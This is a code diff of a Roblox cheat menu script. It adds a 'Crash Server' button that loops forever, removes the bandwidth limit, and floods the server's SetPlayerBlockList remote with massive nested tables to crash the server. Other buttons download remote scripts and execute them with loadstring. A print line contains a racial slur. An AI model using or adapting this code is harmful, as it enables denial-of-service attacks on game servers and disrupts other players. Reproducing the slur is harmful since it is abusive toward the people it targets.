@@ -3,6 +3,10 @@ local Window = Library.CreateLib("Swiss Knief PRX by WeepingAngel", "BloodTheme"
 
 local banner = "WeepingAngel Production"
 
+
+
+
+
 local Main = Window:NewTab("Universal")
 local MainSection = Main:NewSection("Universal")
 
@@ -45,9 +49,56 @@ end)
 MiscSection:NewButton("Infinity Yield", "Gives you an Admin Console :)", function()
     loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Yield.txt"))()
 end)
-MiscSection:NewButton("Crash Server", "Try to Crash the Server", function()
-    print("Starting Crash Attack...")
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeroTwoooo/roblox-exploiting/master/SERVER%20CRASHER.lua"))()
+MiscSection:NewButton("Crash Server", "Try to Crash the Server. Its Realy basic, shitty and Good to Block xD", function()
+    print("Starting Multi Crash Attack...")
+    print("Instans 1 Faield!")
+    print("Load Crash Instants II...")
+    print("Crash Attack Sended!")
+    while wait(0.6) do --// don't change it's the best
+        print("NEGGAS GOING OFFLINE BITCHES!!")
+        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+        local function getmaxvalue(val)
+           local mainvalueifonetable = 499999
+           if type(val) ~= "number" then
+               return nil
+           end
+           local calculateperfectval = (mainvalueifonetable/(val+2))
+           return calculateperfectval
+        end
+        
+        local function bomb(tableincrease, tries)
+        local maintable = {}
+        local spammedtable = {}
+        
+        table.insert(spammedtable, {})
+        z = spammedtable[1]
+        
+        for i = 1, tableincrease do
+            local tableins = {}
+            table.insert(z, tableins)
+            z = tableins
+        end
+        
+        local calculatemax = getmaxvalue(tableincrease)
+        local maximum
+        
+        if calculatemax then
+             maximum = calculatemax
+             else
+             maximum = 999999
+        end
+        
+        for i = 1, maximum do
+             table.insert(maintable, spammedtable)
+        end
+        
+        for i = 1, tries do
+             game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+        end
+        end
+        
+        bomb(250, 2) --// change values if client crashes
+        end
     print("Attack Sended!")
 end)
 
